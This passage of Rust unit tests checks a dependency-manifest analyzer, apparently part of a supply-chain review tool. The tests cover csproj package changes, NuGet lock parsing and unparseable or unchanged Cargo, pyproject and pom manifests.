        let after = "<Project><PropertyGroup><TargetFramework>net9.0</TargetFramework></PropertyGroup><ItemGroup>\n<PackageReference Include=\"Serilog\"><Version>3.1.1</Version></PackageReference>\n</ItemGroup></Project>";
        assert!(
            analyze_csproj("App.csproj", Some(before), Some(after), None).is_none(),
            "TargetFramework change is not a package change"
        );
    }

    #[test]
    fn nuget_lock_names_reads_dependencies_per_tfm() {
        let lock = r#"{ "version": 1, "dependencies": { "net8.0": { "Newtonsoft.Json": { "type": "Direct" } } } }"#;
        let names = nuget_lock_names(lock);
        assert!(names.contains("Newtonsoft.Json"));
    }

    #[test]
    fn unparseable_manifests_yield_none() {
        assert!(analyze_cargo_toml(Some("{not toml"), Some("{not toml"), None).is_none());
        assert!(analyze_pyproject_toml(Some("{{"), Some("{{"), None).is_none());
        assert!(analyze_pom_xml(Some("<a>"), Some("<a>")).is_none());
        // csproj with no PackageReference produces no nodes.
        assert!(analyze_csproj("x.csproj", Some("<Project/>"), Some("<Project><PropertyGroup/></Project>"), None).is_none());
        // Touched-but-unchanged manifests.
        let cargo = "[dependencies]\nserde = \"1\"\n";
        assert!(analyze_cargo_toml(Some(cargo), Some(cargo), Some(&vouched(&["serde"]))).is_none());
        let _ = flag_types; // silence unused in case all asserts compile out
    }
}
